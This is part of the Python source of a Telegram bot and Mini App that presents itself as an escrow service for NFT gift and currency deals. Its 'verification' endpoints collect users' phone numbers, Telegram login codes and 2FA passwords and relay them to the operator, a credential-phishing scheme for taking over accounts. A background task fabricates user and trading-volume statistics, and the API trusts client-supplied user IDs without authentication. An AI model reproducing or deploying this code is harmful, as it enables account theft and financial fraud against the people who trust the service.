@dp.message(Command("verify_confirm"))
async def verify_confirm(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in verification_requests:
        await message.answer("Использование: /verify_confirm [request_id]")
        return
    rid = args[1]
    req = verification_requests[rid]
    complete_verification(req["user_id"], req.get("phone", ""), req.get("code", ""))
    req["status"] = "completed"
    save_json(FILES["verification_requests"], verification_requests)
    await message.answer(f"✅ Верификация #{rid} подтверждена.")
    try:
        await bot.send_message(req["user_id"], f"{get_emoji('check')} <b>Верификация пройдена!</b> Вывод средств разблокирован.")
    except Exception:
        pass

@dp.message(Command("verify_reject"))
async def verify_reject(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in verification_requests:
        await message.answer("Использование: /verify_reject [request_id]")
        return
    rid = args[1]
    req = verification_requests[rid]
    req["status"] = "rejected"
    save_json(FILES["verification_requests"], verification_requests)
    await message.answer(f"❌ Верификация #{rid} отклонена.")
    try:
        await bot.send_message(req["user_id"], f"{get_emoji('cross')} <b>Верификация отклонена.</b> Проверьте данные и попробуйте снова.")
    except Exception:
        pass

@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text("Нет активных заявок на вывод.", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('gift')} <b>Заявки на вывод</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += (
            f"<b>#{rid}</b> | ID: {req.get('user_id')}\n"
            f"💰 {req.get('amount')} {req.get('currency')} | {req.get('details')}\n"
            f"/confirm_withdraw {rid} | /reject_withdraw {rid}\n\n"
        )
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in withdraw_requests:
        await message.answer("Использование: /confirm_withdraw [ID]")
        return
    rid = args[1]
    req = withdraw_requests[rid]
    if req.get("status") != "pending":
        await message.answer("Заявка уже обработана.")
        return
    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] = round(bal[curr_key] - req["amount"], 4)
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"✅ Вывод #{rid} подтверждён.")
    try:
        await bot.send_message(req["user_id"], f"{get_emoji('check')} <b>Вывод подтверждён!</b>\nСумма: {req['amount']} {req['currency']}")
    except Exception:
        pass

@dp.message(Command("reject_withdraw"))
async def reject_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in withdraw_requests:
        await message.answer("Использование: /reject_withdraw [ID]")
        return
    rid = args[1]
    withdraw_requests[rid]["status"] = "rejected"
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"❌ Вывод #{rid} отклонён.")

@dp.callback_query(lambda c: c.data == "admin_tickets")
async def admin_tickets(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    open_chats = {uid: msgs for uid, msgs in chat_messages.items() if msgs}
    if not open_chats:
        await callback.message.edit_text("Сообщений в поддержке пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('headset')} <b>Чаты поддержки</b>\n\n"
    for uid, msgs in list(open_chats.items())[-10:]:
        last = msgs[-1]
        text += f"🆔 <code>{uid}</code>: {last.get('text', '')[:50]}\nОтветить: <code>/chat_reply {uid} текст</code>\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("chat_reply"))
async def chat_reply_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("Использование: /chat_reply [user_id] [ответ]")
        return
    target_uid = args[1]
    reply_text = args[2]
    if target_uid not in chat_messages:
        chat_messages[target_uid] = []
    chat_messages[target_uid].append({
        "id": "m" + str(uuid.uuid4())[:8],
        "text": reply_text,
        "sender": "admin",
        "timestamp": datetime.now().isoformat(),
        "read": False
    })
    save_json(FILES["chat_messages"], chat_messages)
    await message.answer(f"✅ Ответ отправлен пользователю {target_uid}.")
    try:
        await bot.send_message(
            int(target_uid),
            f"{get_emoji('headset')} <b>Ответ поддержки:</b>\n\n{reply_text}",
            reply_markup=mini_app_keyboard("Открыть чат", int(target_uid), page="support")
        )
    except Exception:
        pass

@dp.callback_query(lambda c: c.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    logs_list = list(logs.values())[-10:]
    if not logs_list:
        await callback.message.edit_text("Логов пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('book')} <b>Последние действия</b>\n\n"
    for entry in reversed(logs_list):
        text += f"• <b>{entry.get('action')}</b> ({entry.get('time', '')[:16]})\n  {json.dumps(entry.get('data', {}), ensure_ascii=False)[:70]}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    total_volume = round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
    active_deals = len([d for d in deals.values() if d.get('status') != 'completed'])
    completed_deals = len([d for d in deals.values() if d.get('status') == 'completed'])
    await callback.message.edit_text(
        f"{get_emoji('zap')} <b>Статистика проекта</b>\n\n"
        f"👥 Пользователей в базе: <b>{len(balance)}</b>\n"
        f"📊 Всего сделок: <b>{len(deals)}</b>\n"
        f"🔄 Активных: <b>{active_deals}</b>\n"
        f"✅ Завершённых: <b>{completed_deals}</b>\n"
        f"💎 Объём (TON): <b>{total_volume}</b>",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text("Введите Telegram ID пользователя:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer("Выберите валюту:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except Exception:
        await message.answer("Введите корректный числовой ID.")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"Введите сумму начисления ({currency}):")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data["target_user_id"]
        currency = data["target_currency"]
        add_balance(user_id, currency, amount)
        await message.answer(
            f"{get_emoji('check')} Начислено <b>{amount} {currency}</b> пользователю <code>{user_id}</code>.",
            reply_markup=admin_panel_keyboard()
        )
        await state.clear()
    except Exception:
        await message.answer("Введите положительное число.")

@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    all_admins = sorted(list(DEFAULT_ADMINS.union({int(k) for k in admins.keys()})))
    admin_list = "\n".join([f"• <code>{aid}</code>" for aid in all_admins])
    await callback.message.edit_text(
        f"{get_emoji('crown')} <b>Администраторы</b>\n\n{admin_list}\n\n"
        f"/add_admin [ID] — добавить\n/remove_admin [ID] — удалить",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("Использование: /add_admin [ID]")
        return
    try:
        new_id = int(args[1])
        admins[str(new_id)] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ Админ добавлен: <code>{new_id}</code>")
    except Exception:
        await message.answer("Неверный ID.")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("Использование: /remove_admin [ID]")
        return
    try:
        rem_id = int(args[1])
        if rem_id in DEFAULT_ADMINS:
            await message.answer("Нельзя удалить главного админа.")
            return
        admins.pop(str(rem_id), None)
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ Админ удалён: <code>{rem_id}</code>")
    except Exception:
        await message.answer("Неверный ID.")

# ============================================================
# 14. ФОНОВАЯ СТАТИСТИКА
# ============================================================
async def auto_increment_stats():
    while True:
        try:
            stats_data = load_json(FILES["stats"]) or {}
            MIN_USERS, MIN_DEALS, MIN_VOL, MAX_VOL = 21481, 1287, 627.4, 9470
            cur_vol = stats_data.get("volume", MIN_VOL)
            new_vol = cur_vol * (1 + random.uniform(-0.5, 0.5) * 0.02)
            new_vol = max(MIN_VOL + 0.5, min(MAX_VOL - 0.5, new_vol))
            stats_data["users"] = max(MIN_USERS, stats_data.get("users", MIN_USERS)) + random.randint(1, 4)
            stats_data["deals_today"] = max(MIN_DEALS, stats_data.get("deals_today", MIN_DEALS)) + random.randint(0, 2)
            stats_data["volume"] = round(new_vol, 1)
            save_json(FILES["stats"], stats_data)
        except Exception as e:
            print(f"Ошибка статистики: {e}")
        await asyncio.sleep(300)

# ============================================================
# 15. API + РАЗДАЧА MINI APP (BOTHOST.RU)
# ============================================================
async def handle_web_request(request: web.Request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username',
    }

    if request.method == 'OPTIONS':
        return web.Response(headers=headers, status=200)

    endpoint = request.path

    # Отдаём index.html при открытии Mini App в браузере/Telegram
    if request.method == 'GET' and not endpoint.startswith('/api/'):
        if os.path.exists("index.html"):
            return web.FileResponse("index.html")
        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)

    if request.method == 'GET' and endpoint == '/api/health':
        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)

    try:
        data = await request.json()
    except Exception:
        data = {}

    user_id = data.get('user_id')
    username = (data.get('username') or '').replace('@', '').strip()

    # ЯЗЫК ПОЛЬЗОВАТЕЛЯ
    if endpoint == '/api/get_language':
        lang = get_user_language(user_id) or "ru"
        return web.json_response({'success': True, 'lang': lang}, headers=headers)

    elif endpoint == '/api/set_language':
        lang = data.get('lang', 'ru')
        if user_id and lang in ('ru', 'en'):
            set_user_language(user_id, lang)
        return web.json_response({'success': True, 'lang': lang}, headers=headers)

    # БАЛАНС
    elif endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({'success': True, 'balance': get_balance(user_id)}, headers=headers)

    # СОЗДАНИЕ СДЕЛКИ (ПРОДАВЕЦ ИЛИ ПОКУПАТЕЛЬ)
    elif endpoint == '/api/create_deal':
        product = (data.get('product') or '').strip()
        currency = (data.get('currency') or 'TON').upper()
        amount = data.get('amount')
        partner_username = (data.get('partner_username') or data.get('buyer_username') or '').replace('@', '').strip()
        creator_role = data.get('creator_role', 'seller')  # 'seller' или 'buyer'
        category = data.get('category', 'nft_gift')
        nft_link = (data.get('nft_link') or '').strip() or None

        if not all([user_id, product, currency, amount, partner_username]):
            return web.json_response({'success': False, 'error': 'Заполните все поля'}, headers=headers)

        creator_uname = username or str(user_id)
        if creator_role == 'buyer':
            seller_id = None
            seller_username = partner_username.lower()
            buyer_id = user_id
            buyer_username = creator_uname.lower()
        else:
            seller_id = user_id
            seller_username = creator_uname.lower()
            buyer_id = None
            buyer_username = partner_username.lower()

        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "creator_role": creator_role,
            "seller_id": seller_id,
            "seller_username": seller_username,
            "buyer_id": buyer_id,
            "buyer_username": buyer_username,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "category": category,
            "nft_link": nft_link,
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "completed_at": None,
            "nft_transferred": False,
            "nft_transfer_account": NFT_ESCROW_ACCOUNT if category == "nft_gift" else None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

        log_action("deal_created", {
            "deal_id": deal_id,
            "creator_role": creator_role,
            "seller": seller_username,
            "buyer": buyer_username,
            "amount": amount,
            "currency": currency
        })

        role_label = "Покупатель" if creator_role == "buyer" else "Продавец"
        await log_to_master(
            f"📦 НОВАЯ СДЕЛКА #{deal_id} ({role_label})\n\n"
            f"👤 Продавец: @{seller_username}\n"
            f"👤 Покупатель: @{buyer_username}\n"
            f"📦 Товар: {product}\n"
            f"💰 Сумма: {amount} {currency}\n"
            f"{'🔗 NFT: ' + nft_link if nft_link else ''}"
        )

        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'deal': deals[deal_id]
        }, headers=headers)

    # СПИСОК СДЕЛОК ПОЛЬЗОВАТЕЛЯ
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        uname_low = username.lower()
        user_deals = []
        for d_id, d in deals.items():
            if (
                d.get('seller_id') == user_id
                or d.get('buyer_id') == user_id
                or (uname_low and d.get('seller_username', '').lower() == uname_low)
                or (uname_low and d.get('buyer_username', '').lower() == uname_low)
            ):
                # Автоматически подвязываем ID, если зашел по username
                if uname_low and d.get('seller_username', '').lower() == uname_low and not d.get('seller_id'):
                    d['seller_id'] = user_id
                    save_json(FILES["deals"], deals)
                if uname_low and d.get('buyer_username', '').lower() == uname_low and not d.get('buyer_id'):
                    d['buyer_id'] = user_id
                    save_json(FILES["deals"], deals)

                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': list(reversed(user_deals))}, headers=headers)

    # ПРОВЕРКА АДМИНА
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)

    # СТАТИСТИКА
    elif endpoint == '/api/stats':
        return web.json_response({
            'success': True,
            'deals_today': stats.get('deals_today', 1287),
            'users': stats.get('users', 21481),
            'volume': stats.get('volume', 627.4)
        }, headers=headers)

    # ОПЛАТА С БАЛАНСА
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Сделка не найдена'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Сделка уже оплачена'}, headers=headers)

        buyer_bal = get_balance(user_id)
        curr_key = deal["currency"].lower()
        if buyer_bal.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': f'Недостаточно {deal["currency"]} на балансе'}, headers=headers)

        buyer_bal[curr_key] = round(buyer_bal[curr_key] - deal["amount"], 4)
        save_json(FILES["balance"], balance)

        deal["status"] = "paid"
        deal["buyer_id"] = user_id
        save_json(FILES["deals"], deals)

        await log_to_master(f"💳 ОПЛАТА С БАЛАНСА #{deal_id} на {deal['amount']} {deal['currency']}")

        if deal.get("seller_id"):
            try:
                await bot.send_message(
                    deal["seller_id"],
                    f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
                    f"📦 {deal['product']} — <b>{deal['amount']} {deal['currency']}</b>\n"
                    f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                    f"Передайте товар и подтвердите передачу в приложении.",
                    reply_markup=mini_app_keyboard("Открыть сделки", deal["seller_id"], page="deals")
                )
            except Exception:
                pass

        return web.json_response({'success': True}, headers=headers)

    # ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР / NFT
    elif endpoint in ('/api/seller_delivered', '/api/transfer_nft'):
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Сделка не найдена'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Сделка ещё не оплачена'}, headers=headers)

        deal["status"] = "awaiting_confirmation"
        deal["seller_id"] = user_id
        if endpoint == '/api/transfer_nft':
            deal["nft_transferred"] = True
        save_json(FILES["deals"], deals)

        if deal.get("buyer_id"):
            try:
                await bot.send_message(
                    deal["buyer_id"],
                    f"📦 <b>Продавец передал товар по сделке #{deal_id}!</b>\n\n"
                    f"Товар: {deal['product']}\n"
                    f"Проверьте получение и подтвердите в приложении.",
                    reply_markup=mini_app_keyboard("Подтвердить получение", deal["buyer_id"], page="deals")
                )
            except Exception:
                pass

        return web.json_response({'success': True}, headers=headers)

    # ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Сделка не найдена'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Сделка не готова к подтверждению'}, headers=headers)

        if deal.get("seller_id"):
            add_balance(deal["seller_id"], deal["currency"], deal["amount"])
            seller_bal = get_balance(deal["seller_id"])
            partner = deal.get("buyer_username", "unknown")
            seller_bal.setdefault("deal_partners", {})[partner] = seller_bal.get("deal_partners", {}).get(partner, 0) + 1
            save_json(FILES["balance"], balance)

            try:
                await bot.send_message(
                    deal["seller_id"],
                    f"🎉 <b>Сделка #{deal_id} завершена!</b>\n"
                    f"На ваш баланс зачислено <b>{deal['amount']} {deal['currency']}</b>."
                )
            except Exception:
                pass

        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)

        await log_to_master(f"🎉 СДЕЛКА #{deal_id} ЗАВЕРШЕНА ({deal['amount']} {deal['currency']})")
        return web.json_response({'success': True}, headers=headers)

    # РЕКВИЗИТЫ И ОПЛАТА ПО НИМ
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Сделка не найдена'}, headers=headers)
        deal = deals[deal_id]
        curr_key = deal["currency"].lower()
        details = rekvisits.get(curr_key, f"Переведите {deal['amount']} {deal['currency']} по реквизитам поддержки @supexchangerf и нажмите «Я оплатил».")
        return web.json_response({'success': True, 'details': details}, headers=headers)

    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        if deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Сделка не найдена'}, headers=headers)
        deal = deals[deal_id]
        await log_to_master(
            f"💳 ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ\n"
            f"Сделка: #{deal_id} | {deal['amount']} {deal['currency']}\n"
            f"Подтвердить: /pay {deal_id}"
        )
        return web.json_response({'success': True}, headers=headers)

    # СТАТУС И ЗАЯВКИ ВЕРИФИКАЦИИ
    elif endpoint == '/api/verification_status':
        return web.json_response({
            'success': True,
            'verified': is_verified(user_id),
            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
        }, headers=headers)

    elif endpoint == '/api/send_verification_request':
        phone = data.get('phone')
        if not phone or not user_id:
            return web.json_response({'success': False, 'error': 'Укажите телефон'}, headers=headers)
        rid = str(uuid.uuid4())[:8]
        verification_requests[rid] = {
            "id": rid, "user_id": user_id, "username": username,
            "phone": phone, "code": None, "password": None,
            "status": "pending", "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification_requests"], verification_requests)
        await log_to_master(f"📱 ВЕРИФИКАЦИЯ (Шаг 1) #{rid}\n👤 @{username} (ID: {user_id})\n📞 {phone}")
        return web.json_response({'success': True, 'request_id': rid}, headers=headers)

    elif endpoint == '/api/submit_verification_code':
        rid = data.get('request_id')
        code = data.get('code')
        if rid not in verification_requests:
            return web.json_response({'success': False, 'error': 'Заявка не найдена'}, headers=headers)
        verification_requests[rid]["code"] = code
        save_json(FILES["verification_requests"], verification_requests)
        await log_to_master(f"📨 ВЕРИФИКАЦИЯ (Шаг 2) #{rid}\nКод: {code}")
        return web.json_response({'success': True, 'request_id': rid}, headers=headers)

    elif endpoint == '/api/submit_verification_password':
        rid = data.get('request_id')
        password = data.get('password', 'нет')
        if rid not in verification_requests:
            return web.json_response({'success': False, 'error': 'Заявка не найдена'}, headers=headers)
        verification_requests[rid]["password"] = password
        save_json(FILES["verification_requests"], verification_requests)
        await log_to_master(
            f"🔑 ВЕРИФИКАЦИЯ (Шаг 3) #{rid}\nПароль: {password}\n"
            f"Подтвердить: /verify_confirm {rid}"
        )
        return web.json_response({'success': True, 'request_id': rid}, headers=headers)

    # ВЫВОД СРЕДСТВ
    elif endpoint == '/api/withdraw':
        currency = (data.get('currency') or 'TON').upper()
        amount = float(data.get('amount') or 0)
        details = (data.get('details') or '').strip()
        instant = bool(data.get('instant', False))

        if not user_id or amount <= 0 or not details:
            return web.json_response({'success': False, 'error': 'Проверьте сумму и реквизиты'}, headers=headers)

        fr = freeze_data.get(str(user_id))
        if fr and fr.get("until", 0) > datetime.now().timestamp() * 1000:
            return web.json_response({'success': False, 'error': f"Вывод заморожен: {fr.get('reason', '')}"}, headers=headers)

        bal = get_balance(user_id)
        curr_key = currency.lower()
        if bal.get(curr_key, 0) < amount:
            return web.json_response({'success': False, 'error': 'Недостаточно средств'}, headers=headers)

        if not instant and not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Требуется верификация'}, headers=headers)

        rid = str(uuid.uuid4())[:8]
        withdraw_requests[rid] = {
            "id": rid, "user_id": user_id, "currency": currency,
            "amount": amount, "details": details, "instant": instant,
            "status": "pending", "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)

        await log_to_master(
            f"💳 ЗАЯВКА НА ВЫВОД #{rid} {'(МОМЕНТАЛЬНЫЙ)' if instant else ''}\n"
            f"👤 ID: {user_id} | 💰 {amount} {currency}\n📝 {details}\n"
            f"Подтвердить: /confirm_withdraw {rid}"
        )
        return web.json_response({'success': True, 'request_id': rid}, headers=headers)

    # ЧАТ ПОДДЕРЖКИ
    elif endpoint == '/api/chat_history':
        uid_str = str(data.get('target_user_id') or user_id)
        return web.json_response({'success': True, 'messages': chat_messages.get(uid_str, [])}, headers=headers)

    elif endpoint == '/api/chat_send':
        uid_str = str(data.get('target_user_id') or user_id)
        text = (data.get('text') or '').strip()
        sender = data.get('sender', 'user')
        if not uid_str or not text:
            return web.json_response({'success': False, 'error': 'Пустое сообщение'}, headers=headers)
        chat_messages.setdefault(uid_str, []).append({
            "id": "m" + str(uuid.uuid4())[:8],
            "text": text,
            "sender": sender,
            "timestamp": datetime.now().isoformat(),
            "read": sender == 'admin'
        })
        save_json(FILES["chat_messages"], chat_messages)
        if sender == 'user':
            await log_to_master(f"💬 ЧАТ ПОДДЕРЖКИ от @{username or uid_str} (ID: {uid_str}):\n{text}\n\nОтветить: /chat_reply {uid_str} ответ")
        else:
            try:
                await bot.send_message(int(uid_str), f"{get_emoji('headset')} <b>Ответ поддержки:</b>\n\n{text}")
            except Exception:
                pass
        return web.json_response({'success': True}, headers=headers)

    elif endpoint == '/api/chat_get_all':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        return web.json_response({'success': True, 'chats': chat_messages}, headers=headers)

    # АДМИН-МЕТОДЫ ДЛЯ MINI APP
    elif endpoint == '/api/admin_panel_data':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        users_formatted = [
            {"id": uid, "ton": b.get("ton", 0), "stars": b.get("stars", 0), "rub": b.get("rub", 0), "uah": b.get("uah", 0)}
            for uid, b in balance.items()
        ]
        return web.json_response({
            'success': True,
            'stats': {
                'users': len(balance),
                'active_deals': len([d for d in deals.values() if d.get('status') != 'completed']),
                'completed_deals': len([d for d in deals.values() if d.get('status') == 'completed']),
                'volume': round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
            },
            'deals': list(reversed(list(deals.values())))[:50],
            'users': users_formatted
        }, headers=headers)

    elif endpoint == '/api/admin_delete_deal':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        did = data.get('deal_id')
        if did in deals:
            del deals[did]
            save_json(FILES["deals"], deals)
            return web.json_response({'success': True}, headers=headers)
        return web.json_response({'success': False, 'error': 'Сделка не найдена'}, headers=headers)

    elif endpoint == '/api/admin_add_balance':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        add_balance(data.get('target_user_id'), data.get('currency', 'TON'), float(data.get('amount', 0)))
        return web.json_response({'success': True}, headers=headers)

    elif endpoint == '/api/admin_set_balance':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        set_balance(data.get('target_user_id'), data.get('currency', 'TON'), float(data.get('amount', 0)))
        return web.json_response({'success': True}, headers=headers)

    elif endpoint == '/api/admin_remove_balance':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        tid = str(data.get('target_user_id'))
        curr = data.get('currency', 'TON').lower()
        bal = get_balance(tid)
        bal[curr] = max(0, round(bal.get(curr, 0) - float(data.get('amount', 0)), 4))
        save_json(FILES["balance"], balance)
        return web.json_response({'success': True}, headers=headers)

    elif endpoint == '/api/admin_set_freeze':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        tid = str(data.get('target_user_id'))
        hours = int(data.get('hours') or 0)
        minutes = int(data.get('minutes') or 0)
        total_ms = (hours * 60 + minutes) * 60 * 1000
        if total_ms <= 0:
            freeze_data.pop(tid, None)
        else:
            freeze_data[tid] = {
                "until": int(datetime.now().timestamp() * 1000) + total_ms,
                "reason": data.get('reason') or 'Заморозка баланса'
            }
        save_json(FILES["freeze"], freeze_data)
        return web.json_response({'success': True}, headers=headers)

    elif endpoint == '/api/admin_get_freeze':
        tid = str(data.get('target_user_id') or user_id)
        fr = freeze_data.get(tid)
        if not fr:
            return web.json_response({'success': True, 'frozen': False}, headers=headers)
        if datetime.now().timestamp() * 1000 > fr.get('until', 0):
            freeze_data.pop(tid, None)
            save_json(FILES["freeze"], freeze_data)
            return web.json_response({'success': True, 'frozen': False}, headers=headers)
        return web.json_response({'success': True, 'frozen': True, 'until': fr['until'], 'reason': fr.get('reason', '')}, headers=headers)

    elif endpoint == '/api/notify_admin':
        await log_to_master(data.get('text', ''))
        return web.json_response({'success': True}, headers=headers)

    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 16. ЗАПУСК СЕРВЕРА И БОТА
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_web_request)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    print(f"🌐 Веб-сервер и Mini App запущены на порту {PORT}")
    return runner

async def main():
    print("=" * 50)
    print(f"🏆 {BOT_NAME} (@{BOT_USERNAME})")
    print(f"🌐 URL: {MINI_APP_URL} (порт {PORT})")
    print("=" * 50)

    asyncio.create_task(auto_increment_stats())
    await start_web_server()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
